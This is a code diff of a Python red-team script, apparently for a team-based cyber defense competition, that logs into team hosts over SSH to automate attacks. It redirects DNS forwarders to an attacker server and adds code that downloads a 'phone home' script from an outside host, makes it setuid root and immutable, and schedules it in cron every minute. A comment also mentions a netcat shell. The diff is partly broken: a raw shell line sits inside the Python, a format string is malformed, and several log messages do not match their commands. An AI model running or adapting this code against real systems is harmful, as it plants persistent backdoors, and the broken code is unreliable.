@@ -24,7 +24,7 @@ class Team:
         self.number = team_number
         self.ubuntu = Host(team_number, "dns", last_octet=23)
         self.centos = Host(team_number, "ecom", last_octet=11)
-        self.pfsense = Host(team_number, "pfsense", last_octet=2, username="admin", password="changeme")
+        self.pfsense = Host(team_number, "pfsense", last_octet=2)
 
 def main():
     last_octet = {}
@@ -190,7 +190,7 @@ def universal_linux_attack(host):
     ssh.prompt()
     log_line(ssh.before.decode('utf8'), host)
     """
-    # add netcat shell to cron
+
     netcat_port = "1{}{}".format(host.team, host.last_octet)
     # https://stackoverflow.com/questions/4880290/how-do-i-create-a-crontab-through-a-script
     ssh.close()
@@ -202,7 +202,7 @@ def ubuntu_attacks(host):
     ssh = pxssh.pxssh()
     ssh.login(host.ip, host.username, password=host.password)
     red_team_dns = "10.0.0.23"
-    change_forwarders_cmd = r"sed -i s/131\.239\.30\.1/{}/g".format(red_team_dns)
+    change_forwarders_cmd = "sed -i s/172\.25.\.{}\.1/{}/g".format(red_team_dns)
     reload_bind_cmd = '/etc/init.d/bind9 restart'
 
     ssh.prompt()
@@ -210,6 +210,13 @@ def ubuntu_attacks(host):
     ssh.prompt()
     ssh.sendline(reload_bind_cmd)
 
+     # ez mode /etc/group
+    wget_phonehome_cmd = "wget {}/phonehome.py -O /usr/bin/etph" 
+    log_line("Downloading phone home script on {}".format(host.ip), host, print_flag=True)
+    ssh.sendline(wget_phonehome_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
+    """
 
 
     ## Add ssh key to php
@@ -240,10 +247,42 @@ def ubuntu_attacks(host):
             ssh.prompt()
             log_line(ssh.before.decode('utf8'), host)
     pass
+    """
 
 def centos_attacks(host):
+    ssh = pxssh.pxssh()
+    ssh.login(host.ip, host.username, password=host.password)
     # sudo update-rc.d httpd disable
     # lol
-    pass
+         # ez mode /etc/group
+    wget_phonehome_cmd = "curl {}/phonehome.py -o /usr/bin/etph" 
+    log_line("Downloading phone home script on {}".format(host.ip), host, print_flag=True)
+    ssh.sendline(wget_phonehome_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
+
+    ## Chmod phone home
+    phonehome_perms_cmd = "chmod 6755 /usr/bin/etph"
+    log_line("Setting permissions to 6755 on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
+    ssh.sendline(phonehome_perms_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
+    
+    ## Chmod phone home
+    phonehome_immute_cmd = "chattr +i /usr/bin/etph"
+    log_line("Setting permissions to 755 on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
+    ssh.sendline(phonehome_immute_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
+
+    ## Chown phone home
+    phonehome_chown_cmd = "chown root:root /usr/bin/etph"
+    log_line("Setting permissions to 755 on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
+    ssh.sendline(phonehome_chown_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
+    
+    echo -e "$(crontab -l)\n* * * * * /usr/bin/etph" | crontab -
+    
 
 main()
